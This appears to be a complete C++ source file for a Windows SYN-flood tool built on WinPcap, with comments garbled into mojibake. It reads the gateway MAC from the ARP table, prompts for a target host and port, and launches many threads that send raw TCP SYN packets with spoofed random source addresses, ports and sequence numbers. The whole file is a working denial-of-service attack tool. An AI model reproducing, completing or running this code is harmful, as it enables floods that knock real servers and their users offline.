#include <iostream>
#include <pcap.h>
#include <iphlpapi.h>
#include <packet32.h>
#include <string.h>
#include <winsock2.h>
#include "packet_header.h"

//�̲߳����ṹ��
struct PACKET_PARAM
{
    pcap_t *iface;     //����
    byte *packet;      //���ݰ�
    byte *fake_packet; //α��
    byte4 r;           //�����
    int count;         //��������

} packet_param;

//У��ͼ���
byte2 CheckSum(byte2 packet[], int size)
{
    byte4 cksum = 0;
    while (size > 1)
    {
        cksum += *packet++;
        size -= sizeof(byte2);
    }
    if (size)
        cksum += *(byte *)packet;
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (byte2)(~cksum);
}

//��ȡARP��������MAC
int GetGatewayMac(ETH_HEADER *eth_h, char *gatewayip)
{
    unsigned long table_size = 0; //arp��Ϣ�ṹ���С
    PMIB_IPNETTABLE arp_table = NULL;
    //��ȡarp�ṹ���С
    unsigned long res = GetIpNetTable(arp_table, &table_size, FALSE);
    if (res == ERROR_INSUFFICIENT_BUFFER)
    {
        //�����ڴ�ռ䲢��ȡarp��Ϣ
        arp_table = (PMIB_IPNETTABLE)malloc(table_size);
        if (NO_ERROR == GetIpNetTable(arp_table, &table_size, FALSE))
        {
            //���ж�ȡarp��Ϣ
            PMIB_IPNETROW cur_arp_log = arp_table->table;
            IN_ADDR gatewayaddr;
            for (int k = 0; k < arp_table->dwNumEntries; ++k)
            {
                //ƥ������IP��ַ, ����Ŀ��MACΪ����MAC
                gatewayaddr.S_un.S_addr = cur_arp_log[k].dwAddr;
                if (lstrcmp(inet_ntoa(gatewayaddr), gatewayip) == 0)
                    for (int j = 0; j < cur_arp_log[k].dwPhysAddrLen; j++)
                        memcpy(&eth_h->mac_dst[j], &cur_arp_log[k].bPhysAddr[j], 1);
                else
                    continue;
            }
        }
    }
    else
        return -1;
    delete arp_table;
    return 0;
}

//ѡ������
void ChooseIface(char *iface_name, ETH_HEADER *eth_h)
{
    PIP_ADAPTER_INFO alldevs = new IP_ADAPTER_INFO();  //������Ϣ�б�ͷ
    PIP_ADAPTER_INFO dev;                              //��ǰ������Ϣ
    unsigned long list_size = sizeof(IP_ADAPTER_INFO); //��ȡ�����ṹ���С
    int res = GetAdaptersInfo(alldevs, &list_size);    //��ȡ������Ϣ
    int i = 0, j = 0;                                  //������
    if (ERROR_BUFFER_OVERFLOW == res)
    {
        //�ռ䲻��,ɾ��֮ǰ������ڴ�,���·���
        delete alldevs;
        alldevs = (PIP_ADAPTER_INFO) new BYTE[list_size];
        res = GetAdaptersInfo(alldevs, &list_size);
    }
    if (ERROR_SUCCESS == res)
    {
        //���������������Ϣ����ѡ��
        dev = alldevs;
        while (dev)
        {
            printf("No.%d ", ++i);
            printf("%s\n", dev->Description);
            dev = dev->Next;
        }
    }
    else
    {
        printf("��ȡ������Ϣʧ��\n");
        if (alldevs)
            delete alldevs;
        system("PAUSE");
        exit(-1);
    }
    do
    {
        printf("ѡ������,����������� (1-%d): ", i);
        scanf("%d", &j);
        getchar();
    } while (j < 1 || j > i);
    //ѭ������ѡ����
    for (dev = alldevs, i = 0; i < j - 1; dev = dev->Next, i++)
        ;
    strcat(iface_name, dev->AdapterName); //������������
    //����ԴMAC��ַΪ��ѡ����MAC
    for (i = 0; i < dev->AddressLength; i++)
        memcpy(&eth_h->mac_src[i], &dev->Address[i], 1);
    //ͨ������IP��ѯ����MAC��ַ
    if (GetGatewayMac(eth_h, dev->GatewayList.IpAddress.String) == -1)
    {
        printf("��ȡ����MACʧ��");
        delete alldevs;
        system("PAUSE");
        exit(-1);
    }
    delete alldevs;
    return;
}

//���빥��Ŀ��
void InputDst(IP_HEADER *ip_h, TCP_HEADER *tcp_h, FAKE_HEADER *fake_h)
{
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    char dst[20];
    int i = 0, j = 0;
    printf("������Ŀ��IP������: ");
    gets(dst);
    byte4 ip = inet_addr(dst);
    //�ж��������IP��������
    if (ip == INADDR_NONE)
    {
        struct hostent *host;
        host = gethostbyname(dst);
        if (!host)
        {
            puts("��ȡIP��ַʧ��!");
            system("PAUSE");
            exit(-1);
        }
        //�жϸ������Ƿ�ӵ�ж��IP
        if (host->h_addr_list[1])
        {
            for (i = 0; host->h_addr_list[i]; i++)
                printf("%d: %s\n", i + 1, inet_ntoa(*(IN_ADDR *)host->h_addr_list[i]));
            do
            {
                printf("�������ж��IP��ַ,����Ŀ��IP��� (1-%d): ", i);
                scanf("%d", &j);
            } while (j < 1 || j > i);
            ip = *(byte4 *)host->h_addr_list[--i];
        }
        else
            ip = *(byte4 *)host->h_addr_list[0];
    }
    //����Ŀ��IP
    ip_h->ip_dst = ip;
    fake_h->ip_dst = ip;

    u_short dst_port;
    printf("������Ŀ��˿�: ");
    scanf("%u", &dst_port);
    tcp_h->port_dst = htons(dst_port); //����Ŀ��˿�
    WSACleanup();
    return;
}

//�������ݰ�
void CraftPacket(ETH_HEADER *eth_h, IP_HEADER *ip_h, TCP_HEADER *tcp_h, FAKE_HEADER *fake_h)
{
    //eth��
    // eth_h->mac_dst;
    // eth_h->mac_src;
    eth_h->eth_type = htons(0x0800);

    //ip��
    ip_h->ip_ver = 4;                         //�汾
    ip_h->header_len = sizeof(IP_HEADER) / 4; //IPͷ������
    // ip_h->tos = 0;
    ip_h->total_len = htons(sizeof(IP_HEADER) + sizeof(TCP_HEADER)); //IP+TCPͷ������
    // ip_h->identification = 0;
    // ip_h->rb = 0;
    ip_h->df = 1;
    // ip_h->mf = 0;
    // ip_h->of1 = 0;
    // ip_h->of2 = 0;
    ip_h->ttl = 0xff;
    ip_h->proto = 6;
    // ip_h->ip_crc = 0;
    // ip_h->ip_src;
    // ip_h->ip_dst;

    //tcp��
    // tcp_h->port_src = 0;
    // tcp_h->port_src;
    // tcp_h->sequence = 0;
    // tcp_h->acknowledgement = 0;
    tcp_h->header_len = 20 / 4; //TCPͷ������
    // tcp_h->reserved = 0;
    // tcp_h->nonce = 0;
    // tcp_h->cwr = 0;
    // tcp_h->ecn_echo = 0;
    // tcp_h->urgent = 0
    // tcp_h->ack = 0;
    // tcp_h->push = 0;
    // tcp_h->reset = 0;
    tcp_h->syn = 1;
    // tcp_h->fin = 0;
    tcp_h->windows_size = htons(0xffff); //���ڴ�С
    // tcp_h->tcp_crc = 0;
    // tcp_h->urgent_pointer = 0;

    //αip��ͷ
    // fake_h->ip_src;
    // fake_h->ip_dst;
    // fake_h->padding = 0;
    fake_h->proto = 6;                              //Э��(Protocol)
    fake_h->header_len = htons(sizeof(TCP_HEADER)); //IP���ĳ���
    return;
}

//�����߳�
DWORD WINAPI AttackThread(LPVOID Param)
{
    byte packet[54] = {0};                             //���ݰ�
    byte fake_packet[32] = {0};                        //α��
    int count = packet_param.count;                    //��������
    packet_param.r += 1;                               //�����
    byte4 seed = rand() * packet_param.r;              //�����
    memcpy(packet, packet_param.packet, 54);           //�����ݰ���Ϣ�������̱߳���
    memcpy(fake_packet, packet_param.fake_packet, 32); //��α����Ϣ�������̱߳���

    char baseip[20];
    sprintf(baseip, "10.%u.0.0", (byte4)seed % 0xf); //�����IP
    byte4 ip_s = ntohl(inet_addr(baseip));           //����ʽ
    byte4 seq;                                       //���
    byte2 port_s;                                    //Դ�˿�

    IP_HEADER *ip_h = (IP_HEADER *)(packet + sizeof(ETH_HEADER));                        //IPͷ��
    TCP_HEADER *tcp_h = (TCP_HEADER *)(packet + sizeof(ETH_HEADER) + sizeof(IP_HEADER)); //TCPͷ��
    FAKE_HEADER *fake_h = (FAKE_HEADER *)fake_packet;                                    //αIPͷ��
    TCP_HEADER *fake_tcp_h = (TCP_HEADER *)(fake_packet + sizeof(FAKE_HEADER));          //TCPαͷ��
    while (count > 0)
    {
        //���ԴIP��ַ
        ip_s += ((seed * count) % 0xffff) + 1;
        (*ip_h).ip_src = htonl(ip_s);
        fake_h->ip_src = htonl(ip_s);
        //���Դ�˿�
        port_s = ((seed * count) % 0xff) + 1024;
        tcp_h->port_src = htons(port_s);
        fake_tcp_h->port_src = htons(port_s);
        //������к�
        seq = (seed * count) % 0xffffff;
        tcp_h->sequence = htonl(seq);
        fake_tcp_h->sequence = htonl(seq);
        //����У���
        ip_h->ip_crc = 0;
        tcp_h->tcp_crc = 0;
        //��У���
        ip_h->ip_crc = CheckSum((byte2 *)ip_h, sizeof(IP_HEADER));
        tcp_h->tcp_crc = CheckSum((byte2 *)fake_packet, sizeof(FAKE_HEADER) + sizeof(TCP_HEADER));
        //����
        if (pcap_sendpacket(packet_param.iface, packet, sizeof(packet)) != 0)
        {
            fprintf(stderr, "\n����ʧ��: \n", pcap_geterr(packet_param.iface));
            system("PAUSE");
            exit(-1);
        }
        count -= 1;
    }
    return 0;
}

//���������߳�
void StartAttack(byte4 *dst_ip, byte2 *dst_port)
{
    int i, tc; //������
    printf("���빥���߳���: ");
    scanf("%d", &tc);
    printf("����ÿ�̹߳�������: ");
    scanf("%d", &packet_param.count);
    printf("��ʼ����......\n");
    HANDLE Threads[tc]; //�����߳�
    for (i = 0; i < tc; i++)
        Threads[i] = CreateThread(NULL, 0, AttackThread, NULL, 0, NULL);
    WaitForMultipleObjects(tc, Threads, TRUE, INFINITE);
    //��ִ����Ϻ�ر��߳�
    for (i = 0; i < tc; i++)
        CloseHandle(Threads[i]);
    //���������Ϣ
    printf("����Ŀ�� -> %s:%u\n�����߳���->%u\nÿ���̹߳�������->%d\n",
           inet_ntoa(*(IN_ADDR *)dst_ip), ntohs(*dst_port), tc, packet_param.count);
    printf("�������!\n");
    system("PAUSE");
}

int main(int argc, char **argv)
{
    system("mode con cols=110 lines=20");                                                //���ô��ڴ�С
    byte packet[54] = {0};                                                               //���ݰ�
    byte fake_packet[32] = {0};                                                          //α��
    packet_param.packet = packet;                                                        //�����ݰ��ĵ�ַ�����̲߳����ṹ��
    packet_param.fake_packet = fake_packet;                                              //��α���ĵ�ַ�����̲߳����ṹ��
    pcap_t *iface;                                                                       //�󶨵�����
    ETH_HEADER *eth_h = (ETH_HEADER *)packet;                                            //��̫��ͷ��
    IP_HEADER *ip_h = (IP_HEADER *)(packet + sizeof(ETH_HEADER));                        //IPͷ��
    TCP_HEADER *tcp_h = (TCP_HEADER *)(packet + sizeof(ETH_HEADER) + sizeof(IP_HEADER)); //TCPͷ��
    FAKE_HEADER *fake_h = (FAKE_HEADER *)fake_packet;                                    //αIPͷ��
    TCP_HEADER *fake_tcp_h = (TCP_HEADER *)(fake_packet + sizeof(FAKE_HEADER));          //TCPαͷ��

    char errbuf[PCAP_ERRBUF_SIZE];        //���󻺳�
    char iface_name[100] = {0};           //��������
    strcat(iface_name, "\\Device\\NPF_"); //�Ȼ������������pcap_open_live()������
    ChooseIface(iface_name, eth_h);       //ѡ������,����ԴMAC��Ŀ��MAC
    //������,����(������,Ҫ����Ĳ���,����ģʽ,����ʱʱ��,���󻺳�)
    if ((iface = pcap_open_live(iface_name, 65535, 1, 1000, errbuf)) == NULL)
    {
        fprintf(stderr, "\n�޷��򿪸�����������. WinPcap��֧�� \n");
        system("PAUSE");
        exit(-1);
    }
    packet_param.iface = iface;                                           //�Ѱ󶨵�������ַ�����̲߳����ṹ��
    CraftPacket(eth_h, ip_h, tcp_h, fake_h);                              //�������ݰ�
    InputDst(ip_h, tcp_h, fake_h);                                        //����Ŀ��IP�Ͷ˿�
    memcpy(fake_packet + sizeof(FAKE_HEADER), tcp_h, sizeof(TCP_HEADER)); //��TCPͷ�����ݸ��Ƶ�TCPαͷ��
    StartAttack(&ip_h->ip_dst, &tcp_h->port_dst);                         //���������߳�
    return 0;
}